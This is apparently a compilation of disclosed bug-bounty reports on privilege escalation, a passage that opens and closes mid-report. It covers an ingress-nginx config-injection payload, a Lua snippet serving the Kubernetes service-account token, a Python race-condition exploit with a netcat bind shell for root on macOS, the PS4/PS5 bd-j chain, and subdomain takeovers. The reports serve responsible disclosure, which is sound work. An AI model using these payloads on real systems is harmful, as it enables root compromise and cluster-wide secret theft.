https://<host>/gaf/token

 {F1495370}

Decode the token to see it belongs to the ingress-nginx
{F1495372}
 
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.

## The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:

**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**
The payload above creates the following configuration for nginx:

/etc/nginx/nginx.conf

{F1495371} 

This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.

## Impact

A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

---

### [Acronis True Image Local Privilege Escalation Due To Race Condition In Application Verification ](https://hackerone.com/reports/1251464)

- **Report ID:** `1251464`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Acronis
- **Reporter:** @vkas-afk
- **Bounty:** - usd
- **Disclosed:** 2022-07-28T10:32:00.943Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The Acronis True Image application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does some checks on "console" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the "console" binary **after** it has been checked but **before** it has been run. If we win this race we gain code execution as root from an admin account. 

## Steps To Reproduce
first we make the shell command to run 
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
```
now lets make the c program that will run this shell command naming it test.c
```c
#include <stdlib.h>
int main() 
{
	system("touch pass;bash shell");
	return 0;
}
```
compile the program
```bash
gcc test.c 
```
run the following python program
```python
import os 
import time 

os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")

lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
```
connect to the root shell
```bash
nc 127.0.0.1 8080
```
## Recommendations
Any binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.

## Impact

Local privilege escalation to root.

---

### [bd-j exploit chain](https://hackerone.com/reports/1379975)

- **Report ID:** `1379975`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 20000 usd
- **Disclosed:** 2022-06-10T20:26:04.490Z
- **CVE(s):** -

**Summary (team):**

Hey PlayStation!

Below are 5 vulnerabilities chained together that allows an attacker to gain JIT capabilities and execute arbitrary payloads. The provided payload triggers a buffer overflow that causes a kernel panic. Please consider each of the vulnerabilities individually. AFAIK, this is the first exploit chain that is being submitted to you :)

## Vulnerabilities

### [MEDIUM] [PS4] [PS5] Vulnerability 1

The class `com.sony.gemstack.org.dvb.user.UserPreferenceManagerImpl`  deserializes the `userprefs` file under privileged context using `readObject()` which is insecure:

```java
    private void initPreferences() {
        try {
            UserPreferenceManagerImpl.preferences = AccessController.doPrivileged((PrivilegedExceptionAction<String[][]>)new ReadPreferenceAction());
        }
        catch (PrivilegedActionException ex) {}
        if (UserPreferenceManagerImpl.preferences == null) {
            UserPreferenceManagerImpl.preferences = new String[UserPreferenceManagerImpl.PREFERENCES.length][];
        }
        if (UserPreferenceManagerImpl.preferences[3] == null) {
            UserPreferenceManagerImpl.preferences[3] = new String[] { "26" };
            this.savePreferences();
        }
    }
```

```java
    private static class ReadPreferenceAction implements PrivilegedExceptionAction
    {
        public Object run() throws Exception {
            String[][] array = null;
            ObjectInputStream objectInputStream = null;
            try {
                objectInputStream = new ObjectInputStream(new BufferedInputStream(new FileInputStream(RootCertManager.getOriginalPersistentRoot() + "/userprefs")));
                array = (String[][])objectInputStream.readObject();
            }
            finally {
                if (objectInputStream != null) {
                    objectInputStream.close();
                }
            }
            return array;
        }
    }
```

An attacker can replace the `userprefs` file with a malicious serialized object to **instantiate classes under privileged context**. On older firmwares such as 5.05, where the commit https://github.com/openjdk/jdk/commit/020204a972d9be8a3b2b9e75c2e8abea36d787e9#diff-2c19943dd71743c3de69aa065025e753ca2e1f3b7ebc798e0d954de75d995de5 is not present, exploitation of this vulnerability is easy: An attacker can instantiate a `ClassLoader` subclass to call `defineClass` with all permissions and finally bypass the security manager.

### [MEDIUM] [PS4] Vulnerability 2

The class `com.oracle.security.Service` contains a method `newInstance` which calls `Class.forName` on an arbitrary class name. **This allows arbitrary classes, even restricted ones (for example in `sun.`), to be instantiated**. This works for all classes with public constructors that have single arguments. The check in `newInstance` can be bypassed by calling `com.oracle.ProviderAdapter.setProviderAccessor` on a custom `ProviderAccessor` implementation.

```java
        if (!this.registered) {
            if (ProviderAdapter.getService(this.provider, this.type, this.algorithm) != this) {
                throw new NoSuchAlgorithmException("Service not registered with Provider " + this.provider.getName() + ": " + this);
            }
            this.registered = true;
        }
```

### [MEDIUM] [PS4] [PS5] Vulnerability 3

The class `com.sony.gemstack.org.dvb.io.ixc.IxcProxy` contains the protected method `invokeMethod` which can call methods under privileged context. Permission checks in methods can be bypassed if the following conditions are met:

- The method is public and non-static.
- The method's class is public, non-final and can be instantiated.

In such a scenario, an attacker can write a subclass of the target class which implements an interface where the desired method throws `RemoteException`.

For example, there are permission checks in `File.list()`. An attacker can bypass them with the following classes:

```java
class FileImpl extends File implements FileInterface {
  FileImpl(String pathname) {
    super(pathname);
  }
}
```

```java
interface FileInterface extends Remote {
  public String[] list() throws RemoteException;
}
```

This vulnerability can be used to leak the file system structure as well as dumping files (for example from `/app0/`).

### [HIGH] [PS4] Vulnerability 4

The "compiler receiver thread" receives a structure of size 0x58 bytes from the runtime process:

```c
typedef struct {
  uint8_t cmd; // 0x00
  uint64_t arg0; // 0x08
  uint64_t arg1; // 0x10
  uint64_t arg2; // 0x18
  uint64_t arg3; // 0x20
  uint64_t arg4; // 0x28
  uintptr_t runtime_data; // 0x30
  uintptr_t compiler_data; // 0x38
  uint64_t data1; // 0x40
  uint64_t data2; // 0x48
  uint64_t unk; // 0x50
} CompilerAgentRequest; // 0x58

CompilerAgentRequest req;
while (CompilerAgent::readn(s, &req, sizeof(req)) > 0) {
  uint8_t ack = 0xAA;
  CompilerAgent::writen(s, &ack, sizeof(ack));
  if (req.compiler_data != 0) {
    memcpy(req.compiler_data + 0x28, &req, sizeof(req));
    ...
  }
  ...
}
```

This struct contains a pointer at offset 0x38 (we call it `compiler_data`) from the compiler process which is used to make a backup of the request structure. An attacker can simply send an untrusted pointer and the compiler receiver thread will copy data from the request into its memory. In other words, **we have a write-what-where primitive**. An attacker can exploit this vulnerability by supplying a pointer to JIT memory and store the content to be written in the request. The compiler will write this data into JIT memory and therefore give us the opportunity to execute arbitrary payloads. **This has severe implications**:

- An ELF loader can be written to **load and execute pirated games**.
- **Kernel exploitation becomes trivial** as there is no SMEP and one can simply jump to user with a corrupted function pointer.

### [HIGH] [PS4] [PS5] Vulnerability 5

The UDF driver https://github.com/williamdevries/UDF is used on the PS4 and PS5 which contains a **buffer overflow**. An attacker can make the size `inf_len` larger than `sector_size` (the assumption of internal allocation is that the data is smaller than the sector size) and cause an overflow with `memcpy()`.

```c
int
udf_read_internal(struct udf_node *node, uint8_t *blob)
{
	struct file_entry *fe = node->fe;
	struct extfile_entry *efe = node->efe;
	struct udf_mount *ump;
	uint64_t inflen;
	int addr_type, icbflags;
	uint32_t sector_size;
	uint8_t *pos;

	/* get extent and do some paranoia checks */
	ump = node->ump;
	sector_size = ump->sector_size;

	if (fe != NULL) {
		inflen = le64toh(fe->inf_len);
		pos = &fe->data[0] + le32toh(fe->l_ea);
		icbflags = le16toh(fe->icbtag.flags);
	} else {
		inflen = le64toh(efe->inf_len);
		pos = &efe->data[0] + le32toh(efe->l_ea);
		icbflags = le16toh(efe->icbtag.flags);
	}
	addr_type = icbflags & UDF_ICB_TAG_FLAGS_ALLOC_MASK;

	/* copy out info */
	memset(blob, 0, sector_size);
	memcpy(blob, pos, inflen);

	return (0);
}
```

## Proof-of-concept

Attached is the exploit chain *bd-jb* as a `.iso` file which demonstrates the exploitation of vulnerabilities 1-4 that demonstrates the ability to run arbitrary payloads. Burn the iso image with UDF 2.5 file system. You can send the payload using `nc $PS4IP 1337 < payload.bin`. The provided payload causes a kernel panic by triggering vulnerability 5 (the file `/PWN/0` has been modified to use internal allocation and has a size of 4MB filled with `A`). Tested on latest firmware `9.00`.

## Impact

- With these vulnerabilities, it is possible to **ship pirated games on bluray discs**. That is possible even without a kernel exploit as we have JIT capabilities.

---

### [Upload Profile Photo in any folder you want with any extension you want](https://hackerone.com/reports/753375)

- **Report ID:** `753375`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Stripo Inc
- **Reporter:** @whoisbinit
- **Bounty:** - usd
- **Disclosed:** 2022-03-30T06:21:44.741Z
- **CVE(s):** -

**Summary (team):**

The vulnerability has been fixed

**Summary (researcher):**

Using this vulnerability, a Stripo user becomes able to upload his/her profile photo in any folder (including that of other users), with any file extension as per his/her wish.

---

### [Subdomain Takeover at https://new.rubyonrails.org/](https://hackerone.com/reports/1429148)

- **Report ID:** `1429148`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Ruby on Rails
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2022-03-03T21:12:32.473Z
- **CVE(s):** -

**Vulnerability Information:**

## Disclaimer

I know it's OOS but the issue is pretty serious because of the attractive domain name "new.rubyonrails.org" basically anyone could have put malware there.

## Summary
Hi!

I discovered that new.rubyonrails.org was pointing to an unclaimed Github Page, making it vulnerable to subdomain takeover.
I've managed to claim it in my Github-account and added a simple html file as POC:

{F1548667}

`https://new.rubyonrails.org`

## Mitigation
- Remove the DNS record

Best regards,
nagli

## Impact

Subdomain takeovers can be used for
- Cookies set to the root domain will be shared with this subdomain and can be obtained
- Stored XSS (arbitrary javascript code can be executed in a users browser)
- Phishing
- Hosting malicious content

---

### [EC2 subdomain takeover at http://████████/](https://hackerone.com/reports/1296366)

- **Report ID:** `1296366`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @dreyand_
- **Bounty:** - usd
- **Disclosed:** 2022-02-14T21:24:17.776Z
- **CVE(s):** -

**Vulnerability Information:**

There is a dangling DNS A record that points to an EC2 instance that no longer exists, I was able to claim the EC2 instance and host content on http://███████/.

## Steps To Reproduce:

  1. Visit http://█████████/██████████.html and view the PoC:  ██████


## Suggested Remediation Steps

  Remove the A record pointing to the current ec2 instance. 

## Impact

Hosting content on http://█████/ and potentionally fully bypassing web protections like CORS (in cases of `████████`) or redirecting users to malicious pages.

## Impact

Hosting content on http://██████/ and potentionally fully bypassing web protections like CORS (in cases of `██████████`) or redirecting users to malicious pages,

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Visit http://██████████/█████.html and view the PoC:  █████

## Suggested Mitigation/Remediation Actions
Remove the A record pointing to the current ec2 instance.

---

### [Subdomains takeover of  register.acronis.com, promo.acronis.com, info.acronis.com and promosandbox.acronis.com](https://hackerone.com/reports/1018790)

- **Report ID:** `1018790`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Acronis
- **Reporter:** @ashmek
- **Bounty:** - usd
- **Disclosed:** 2022-02-08T09:12:37.155Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The Subdomains  https://register.acronis.com,  https://promo.acronis.com, https://info.acronis.com  and  https://promosandbox.acronis.com 
are vulnerable to takeover due to unclaimed marketo CNAME records.  Anyone is able to own these  subdomains at the moment.

This vulnerability is called subdomain takeover. You can read more about it here:

    https://blog.sweepatic.com/subdomain-takeover-principles/
    https://hackerone.com/reports/32825
    https://hackerone.com/reports/779442	
    https://hackerone.com/reports/175070

## Steps To Reproduce:

```
nslookup register.acronis.com
Non-authoritative answer:
Name: sjh.mktossl.com
Addresses:104.17.74.206
          104.17.72.206
          104.17.70.206
          104.17.73.206
          104.17.71.206
Aliases:  register.acronis.com
          acronis.mktoweb.com

nslookup promo.acronis.com
Non-authoritative answer:
Name:    sjh.mktossl.com
Addresses:  104.17.71.206
          104.17.70.206
          104.17.74.206
          104.17.72.206
          104.17.73.206
Aliases:  promo.acronis.com
          acronis.mktoweb.com

```

CNAMES entries to corresponding  domains are as:
```
promo.acronis.com                               acronis.mktoweb.com
promosandbox.acronis.com                   acronissandbox2.mktoweb.com
register.acronis.com                            acronis.mktoweb.com
info.acronis.com  	                             mkto-h0084.com
```

As  register.acronis.com and promo.acronis.com pointing to CNAME record as  acronis.mktoweb.com  and are aliases to acronis.mktoweb.com . http://acronis.mktoweb.com/ is giving 404, page not found  with message "The requested URL was not found on this server"  which can  be claimed by anyone now and would result in subdomain takeover.

The marketo document to Customize Your Landing Page URLs with a CNAME
https://docs.marketo.com/display/public/DOCS/Customize+Your+Landing+Page+URLs+with+a+CNAME

**As marketo is a paid service and offers account for marketing automation, I don't have a registered account. 
I wrote to Marketo technical support team and they claim the availability of listed domains as the listed domains are not in use or configured anymore.**

## Supporting Material/References:
Please refer to attached screenshots.

## Impact

With this, I can clearly see XSS impact in your case. Please have a look at your /v2/account request intercepted below:
Request:
```
PUT /v2/account HTTP/1.1
Host: account.acronis.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 702
Origin: https://register.acronis.com
Connection: close
Referer: https://account.acronis.com/
Cookie: _gcl_au=1.1.36144172.1601449011; _ga=GA1.2.1290766356.1601449012; _fbp=fb.1.1601449012432.633797135; _hjid=a7dd36be-ea53-40b1-b04e-c2a96f5ebc3c; optimizelyEndUserId=oeu1601449014822r0.42778295429069313; OptanonConsent=isIABGlobal=false&datestamp=Mon+Oct+26+2020+16%3A35%3A28+GMT%2B0530+(India+Standard+Time)&version=6.6.0&hosts=&consentId=07081eac-3ae3-443d-8451-79f5327d9351&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0004%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false&geolocation=IN%3BHR; _mkto_trk=id:929-HVV-335&token:_mch-acronis.com-1601449020651-40834; OptanonAlertBoxClosed=2020-10-26T11:05:28.204Z; visid_incap_1638029=Bol4fqOiQTKxMXB55rfSHvSPlF8AAAAAQUIPAAAAAACe+MbhqMW1sJI4dpZBH6DI; _hjTLDTest=1; nlbi_1638029=ibxAVmtdEHzy/Y9u+BxnEAAAAAB308NLs7A3ARoQwyk4Cyrg; incap_ses_745_1638029=ddKxJtFthhy2IeNut8VWCvWPlF8AAAAACuwA/vpt+9dXQmj6hoxBWQ==; _gid=GA1.2.639811834.1603690260; _gac_UA-149943-47=1.1603691724.Cj0KCQjwxNT8BRD9ARIsAJ8S5xZC0_Hlxu0wgG7xA0-jU5eIi2BxoGFsRealW_kNcbHRyB_H8h3z-y0aAjFAEALw_wcB; AcronisSID.en=8a4d91ace2ecadca23dda91cdcb5abc5; AcronisUID.en=1438137573; _hjAbsoluteSessionInProgress=1; _uetsid=6d516b50174c11eb8ef2b18637bee740; _uetvid=b490e7509541648c67826dc18a0c7c46; _gat_UA-149943-47=1
```

Response:
```
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 26 Oct 2020 11:59:18 GMT
Content-Type: application/json
Connection: close
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
expires: -1
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 97
Access-Control-Allow-Origin: https://register.acronis.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Accept, Accept-Encoding, Accept-Language, Authorization, Cache-Control, Connection, DNT, Keep-Alive, If-Modified-Since, Origin, Save-Data, User-Agent, X-Requested-With, Content-Type
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
p3p: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 1; mode=block
Content-Length: 714
```
See in response below,:
```
Access-Control-Allow-Origin: https://register.acronis.com
Access-Control-Allow-Credentials: true
```
Access-Control-Allow-Credentials are true for Access-Control-Allow-Origin as *.acronis.com which makes Credentials  true for all subdomains of acronis.com. Cross-Origin Resource Sharing (CORS) allows cross-domain access from all subdomains of acronis.com

Therefore, by taking over listed subdomains or finding any XSS vulnerability in any of the listed subdomains  can  steal user information  or read arbitrary data from the accounts of other users. 

The Subdomain takeover allows various attacks.

    Malware distribution
    Phishing / Spear phishing
    XSS
    Authentication bypass
    ...

List goes on and on. Since some certificate authorities (Let's Encrypt) require only domain verification, SSL certificate can be easily generated.
An attacker can utilize these domains for targeting the organization by fake login forms, or steal sensitive information of teams (credentials,  information, etc)

FIX & MITIGATION
**You should immediately remove the CNAME  entries for these domains or point it elsewhere if you don't use marketo services.**

Please let me know if more info needed or any help.

Best Regards,
Ashmek

---

### [Выполнение API-методов при открытии сообщества/приложения](https://hackerone.com/reports/1354452)

- **Report ID:** `1354452`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** VK.com
- **Reporter:** @executor
- **Bounty:** 2000 usd
- **Disclosed:** 2021-12-30T10:26:00.801Z
- **CVE(s):** -

**Summary (team):**

Недостаточная валидация.

---

### [Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces](https://hackerone.com/reports/1249583)

- **Report ID:** `1249583`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Kubernetes
- **Reporter:** @libio
- **Bounty:** - usd
- **Disclosed:** 2021-12-04T10:16:07.886Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

### Retrieving ingress-nginx serviceaccount token

ingress-nginx allows adding custom snippets of nginx configuration to Kubernetes `ingress` objects. These snippets can be applied to either the relevant `location {}` or `server {}` blocks with the following annotations, respectively.

* https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#configuration-snippet
* https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#server-snippet

Inside the `server {}` block we can add a custom snippet of lua-code that reads the serviceaccount token that is mounted inside the ingress-nginx pod. We then set it as an nginx variable and return it to the client at a configured location. This might look like this:

```yaml
    nginx.ingress.kubernetes.io/server-snippet: |
      set_by_lua $token '
        local file = io.open("/run/secrets/kubernetes.io/serviceaccount/token")
        if not file then return nil end
        local content = file:read "*a"
        file:close()
        return content
      ';

      location = /token {
        content_by_lua_block {
          ngx.say(ngx.var.token)
        }
      }
```

### Impact

The ingress-nginx serviceaccount has the permissions to `list` `secrets` across all namespaces. With the ingress-nginx serviceaccount's token a user, with otherwise restricted privileges, can at least:

* exfiltrate all kubernetes secrets
* get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin

Vendors such as rancher-labs bundle ingress-nginx, or a forked version of ingress-nginx, with their software. Solutions provided by these vendors might also be vulnerable.

### kube-apiserver proxy

ingress-nginx can be configured to expose the Kubernetes kube-apiserver by creating a Kubernetes `Service` of type `ExternalName` and pointing it to `kubernetes.default`; the hostname at which the kubernetes api is available inside the cluster. This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet.

### Requirements to exploit

To successfully exploit this vulnerability an attacker would need access to an already authenticated user or serviceaccount that has the permissions to `create` the following resources inside kubernetes:

* `ingress`
* `service`

Additionally the attacker needs network access to the ingress-nginx-controller loadbalancer or in-cluster service to retrieve the ingress-nginx serviceaccount token. The hostname configured in the `ingress` object does not necessarily have to resolve to the ingress-nginx-controller's loadbalancer; ingress-nginx will also serve us the token if we manually add the `Host`-header.

## Kubernetes Version:

Any, as far as I am aware. This was tested with AWS EKS 1.20.

## Component Version:

Any, as far as I am aware. This was tested with the following release of ingress-nginx:

* chart: `ingress-nginx-3.33.0`
* application: `0.47.0`

## Steps To Reproduce:

I created a proof-of-concept (`poc.sh`) that requires the following:

* A kubernetes cluster with ingress-nginx installed; ingress-nginx should not be restricted to a single namespace
* A local kubeconfig file configured to communicate with the kubernetes cluster
* A user configured in the kubeconfig file with the permissions to `create` `ingress` and `service` objects in the namespace configured in the kubeconfig context

The proof-of-concept requires setting the `INGRESS_HOST` environment variable. This variable should contain a hostname that resolves to the ingress-nginx-controller's loadbalancer. This is made easy on clusters where a wildcard DNS-record is pointing to the loadbalancer.

When invoked, the script will:

1. Apply the required `ingress` and `service`;
   1. exposing the ingress-nginx serviceaccount token at `https://$INGRESS_HOST/token`
   2. proxying all requests to the kubernetes apiserver at `https://$INGRESS_HOST`
2. Retrieve the ingress-nginx serviceaccount token
3. Write a local kubeconfig;
   1. Using the kube-apiserver proxy
   2. Using the ingress-nginx serviceaccount token
4. Write `secrets` from all namespaces to a local file called `secrets.json`
5. For each serviceaccount token found in `secrets.json` check if the serviceaccount has cluster-admin privileges. If so, create a new user and context in the local kubeconfig file with the serviceaccount's token

## Supporting Material/References:

| file           | description                                                                                                                                        |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ingress.yaml` | kubernetes manifest used to create required `service` and `ingress` objects                                                                        |
| `poc.sh`       | proof-of-concept written in bash                                                                                                                   |
| `output.png`   | output of running `poc.sh` against local test cluster<br>getting cluster-admin by finding the serviceaccount tokens of flux and flux-helm-operator |

## Impact

* exfiltrate all kubernetes secrets
* get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin

---

### [Non privileged user is able to approve his own app himself leading to mass privilege  escalations.](https://hackerone.com/reports/1168475)

- **Report ID:** `1168475`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Lark Technologies
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2021-11-20T02:06:12.058Z
- **CVE(s):** -

**Summary (team):**

A privilege escalation vulnerability was identified in Lark which could have potentially allowed an attacker to approve the apps in the same tenant by bypassing the admin approval. We thank @imran_nisar for reporting this to our team.

---

### [Social Club Account Takeover Via RGL And Steam/Epic Linked Account](https://hackerone.com/reports/1235008)

- **Report ID:** `1235008`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Rockstar Games
- **Reporter:** @hacktus
- **Bounty:** - usd
- **Disclosed:** 2021-11-17T16:52:26.112Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher discovered and demonstrated a method to hijack access to a Social Club account via a previously-linked Epic Games or Steam account. 

To perform the attack, the attacker first needed access to a Steam or Epic Games account with entitlement to a game with Social Club connectivity (such as GTAV or RDR2) and that had previously been linked to a Social Club account (i.e. the victim's account). Next, when the attacker would go to launch a R* game, the Launcher would allow the attacker to switch to the victim's Social Club account without prompting for credentials. The Launcher, in this state, assumed that if the current user had access to the linked third-party account (Epic Games or Steam), they must be the authentic user. This assumption gave the attacker access to the victim's entire Social Club account, even if the victim was utilizing mutli-factor authentication.

This issue has been addressed. Account switches occurring in contexts like this one will now require the user to re-authenticate by entering their Social Club account credentials if they have not done so recently on the device in question.

Our thanks again to the researcher for discovering this issue!

---

### [Attacker is able to join any tenant on larksuite and view personal files/chats.](https://hackerone.com/reports/1363185)

- **Report ID:** `1363185`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** Lark Technologies
- **Reporter:** @imran_nisar
- **Bounty:** - usd
- **Disclosed:** 2021-11-03T21:32:22.719Z
- **CVE(s):** -

**Summary (team):**

A privilege escalation issue was found in Open.larksuite.com, which could have potentially allowed attackers to join any tenant, and view files and communications that are shared by team members. We thank @imran_nisar for reporting this to our team and confirming the resolution.

---

### [Subdomain takeover [​████████]](https://hackerone.com/reports/1341133)

- **Report ID:** `1341133`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2021-10-13T22:17:30.087Z
- **CVE(s):** -

**Vulnerability Information:**

The subdomain `███████` was pointing to an Azure Cloud App domain (araz-sp.centralus.cloudapp.azure.com), but that endpoint was not registered.

## Impact

It's extremely vulnerable to attacks as a malicious user could create any web page with any content and host it on the vulnerable domain. This would allow them to post malicious content which would be mistaken for a valid site. 

They could perform several attacks like:
 - Cookie Stealing
 - Phishing campaigns. 
 - Bypass Content-Security Policies and CORS.

 
## Recommendations for fix

* Remove the affected DNS record if not used 
 

### Supporting Material/References:

 - https://0xpatrik.com/subdomain-takeover/
 - https://hackerone.com/reports/661751

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Just go to 

http://████████ 

You will see a blank page, but checking the source code you will see proof of the take over. 

```
<html>  
<!-- poc by deleite --> 
 </html>
```

## Suggested Mitigation/Remediation Actions

---

### [Subdomain takeover of ███](https://hackerone.com/reports/892667)

- **Report ID:** `892667`
- **Severity:** Critical
- **Weakness:** Privilege Escalation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @simplyrishabh
- **Bounty:** - usd
- **Disclosed:** 2021-09-09T19:55:15.327Z
- **CVE(s):** -

**Vulnerability Information:**

#Summary:
The subdomain ██████ had an CNAME record pointing to an unclaimed ███████ webservice. This is a high severity security issue because an attacker can register the subdomain on ███ and therefore can own the subdomain  █████████.



#Description:
The dangling CNAME record of █████████  is pointing to █████.███████ which was not claimed by you. I registered a service with this name and therefore was able to takeover the subdomain. Every attacker doing this has afterwards full control over the contents served on this subdomain.



#Subdomain Affected: 
██████████




#Proof Of Concept:
I have uploaded a simple subdomain takeover PoC on http://███████/████████





# Step-by-step Reproduction Instructions
1. Open ██████ and register for web app which is under market place. I have used ██████  (See: ████)

2. After registering, go to Custom Domains which will be available under settings. (See: ████)

3. In here, add custom domain i have used █████████ (See: █████)

4. After that upload any PoC you want to upload. I have used ████ which has my PoC. (See: ███████)





#Suggested Mitigation/Remediation Actions
1. Remove the dangling CNAME record for █████

2. Claim it back in ███████ portal after I release it

#Reference
Some hackerone reports #661751 #325336

#NOTE:
I have claimed the subdomain http://█████████ at the current moment to keep it safe from malicious users. Whenever you want i will release ██████.███. Afterwards you can claim it back.

## Impact

Subdomain takeover is abused for several purposes:

1.	Malware distribution
2.	Phishing / Spear phishing
3.	XSS

---

### [DNS Miconfiguration Leads to Subdomain Takeover  - max1.liveplan.com](https://hackerone.com/reports/1294492)

- **Report ID:** `1294492`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Palo Alto Software
- **Reporter:** @melbadry9
- **Bounty:** - usd
- **Disclosed:** 2021-09-08T16:45:30.915Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
The issue happens due to using EC2 public DNS instead of using Elastic IPs as `CNAME` record. This report is simliar to report #1069795
 
## Misconfiguration

- DNS Records

```json
{
  "host": "max1.liveplan.com",
  "resolver": [
    "1.0.0.1:53"
  ],
  "a": [
    "54.68.121.128"
  ],
  "cname": [
    "ec2-54-68-121-128.us-west-2.compute.amazonaws.com"
  ],
  "status_code": "NOERROR",
  "timestamp": "2021-08-07T13:41:48.3522806+02:00"     
}
```

- If the EC2 instance is killed or terminated and the DNS was not updated this will lead to creating a dangling DNS record for the subdomain.
- The EC2 IP will be released to AWS IPs pool, This mean it's possible to assign the IP to new EC2 instance.

## PoC

- SSL Certificate Data pulled from `https://max1.liveplan.com` on date `7/8/2021 - 1:40PM`.
- Data was pulled using [SSLEnum](https://github.com/melbadry9/SSLEnum)

```json
{
  "name": "max1.liveplan.com",
  "org": [],
  "cn": [
    "*.test.tugo.com"
  ],
  "alt_doms": [
    "*.test.tugo.com",        
    "*.dev.tugo.com",
    "*.uat.tugo.com"
  ],
  "dangling": true
}
```

- This does prove that `max1.liveplan.com` is currently taken over by  someone.

{F1403387}
 
## Fix
- Use Elastic IPs instead of the public DNS of EC2 instance or clear DNS records for mentioned subdomain

## Supporting Material/References:
- https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state

## Impact

- This could allow the takeover of the EC2 instance IP that will lead to subdomain takeover.

---

### [Local privilege escalation via insecure MSI file](https://hackerone.com/reports/1071832)

- **Report ID:** `1071832`
- **Severity:** High
- **Weakness:** Privilege Escalation
- **Program:** Acronis
- **Reporter:** @twvyy3vyaw8k
- **Bounty:** 250 usd
- **Disclosed:** 2021-08-07T19:11:30.813Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
I've found a vulnerability which leads to a local privilege escalation starting from a non-admin user.

When `True Image` client installs it drops 2 MSI files into `C:\Windows\Installer` folder.
Since this folder (by default) is readable by anyone, a non-admin user can execute commands like `msiexec /fa installer_name.msi`, which forces `installer_name.msi` to "repair" the program.

One of these 2 MSIs (i can't named it because MSI file names are random and unique for every installation) when forced to repair it creates a dll in `%TEMP%\random_name` and then, after some time, `MsiExec.exe` loads it. Since `MsiExec.exe` auto-escalate privileges when executed and `%TEMP%` is writable by anyone, this behavior could be abused to gain `nt authority\system` privileges.

## Steps To Reproduce
  1.  Open `%TEMP%` and `C:\Windows\Installer`
  2.  Locate the MSI file in the installer folder: it's 1.3 GB large and has `Acronis` as author 
